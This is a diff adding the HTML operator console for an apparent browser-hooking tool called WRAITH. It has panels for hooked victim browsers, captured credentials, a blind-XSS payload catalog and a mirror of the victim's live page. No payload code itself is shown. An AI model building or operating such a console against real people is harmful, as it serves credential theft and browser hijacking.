@@ -1,0 +1,99 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>WRAITH — Operator Console</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="operator.css" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">
+      <span class="brand-mark" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round">
+          <circle cx="12" cy="12" r="7.2"/>
+          <line x1="12" y1="1.6" x2="12" y2="5"/><line x1="12" y1="19" x2="12" y2="22.4"/>
+          <line x1="1.6" y1="12" x2="5" y2="12"/><line x1="19" y1="12" x2="22.4" y2="12"/>
+          <circle cx="12" cy="12" r="1.7" fill="currentColor" stroke="none"/>
+        </svg>
+      </span>
+      <span class="brand-text">WRAITH</span>
+    </div>
+    <nav class="viewtabs">
+      <button class="vtab active" type="button" data-view="console">Console</button>
+      <button class="vtab" type="button" data-view="payloads">Payloads</button>
+    </nav>
+    <div class="conn" id="conn"><span class="dot"></span><span id="connText">connecting…</span></div>
+    <form class="logout" method="post" action="/logout"><button type="submit" title="Log out">&#9211;</button></form>
+  </header>
+
+  <main class="layout" id="consoleView">
+    <!-- LEFT: hooked browsers -->
+    <aside class="panel victims">
+      <div class="panel-head">
+        Hooked Browsers <span class="count" id="vcount">0</span>
+      </div>
+      <div id="victimList" class="victim-list">
+        <div class="empty">No browsers hooked yet.<br/><small>Open the demo page in a browser.</small></div>
+      </div>
+    </aside>
+
+    <!-- CENTER: selected victim + deploy -->
+    <section class="panel detail">
+      <div class="panel-head">Target</div>
+      <div id="detail" class="detail-body">
+        <div class="empty">Select a hooked browser on the left.</div>
+      </div>
+    </section>
+
+    <!-- RIGHT: live feed + loot -->
+    <section class="panel feed">
+      <div class="panel-head">
+        Live Activity
+        <button id="clearFeed" class="mini">clear</button>
+      </div>
+      <div id="feed" class="feed-body"></div>
+
+      <div class="panel-head">Captured Credentials <span class="count" id="lootCount">0</span></div>
+      <div id="loot" class="loot-body">
+        <div class="empty">Nothing captured yet.</div>
+      </div>
+    </section>
+  </main>
+
+  <!-- PAYLOADS: XSS-Hunter-style blind-XSS injection catalog -->
+  <main class="payloads-view panel" id="payloadsView" hidden>
+    <div class="panel-head">Blind XSS Payloads
+      <span class="ph-sub">ready-to-fire injection strings that call this WRAITH hook</span>
+    </div>
+    <div id="payloadsBody" class="payloads-body"></div>
+  </main>
+
+  <!-- PAGE MIRROR: recreate the victim's page; click links to fetch more -->
+  <div id="mirrorModal" class="mirror-modal" hidden>
+    <div class="mm-panel">
+      <div class="mm-head">
+        <span class="mm-title">Page Mirror</span>
+        <span class="mm-vid" id="mmVid"></span>
+        <span class="mm-status" id="mmStatus"></span>
+        <button class="mm-x" id="mmClose" type="button" aria-label="Close">&#10005;</button>
+      </div>
+      <div class="mm-nav">
+        <button class="mm-btn" id="mmBack" type="button" title="Back">&#8592;</button>
+        <button class="mm-btn" id="mmLive" type="button" title="Re-grab the victim's current live page">&#8635; live</button>
+        <span class="mm-url" id="mmUrl"></span>
+        <span class="mm-count" id="mmCount"></span>
+      </div>
+      <div class="mm-body">
+        <iframe id="mmFrame" class="mm-frame" sandbox="allow-scripts" referrerpolicy="no-referrer" title="mirrored page"></iframe>
+        <div class="mm-overlay" id="mmOverlay" hidden></div>
+      </div>
+    </div>
+  </div>
+
+  <script src="operator.js"></script>
+</body>
+</html>
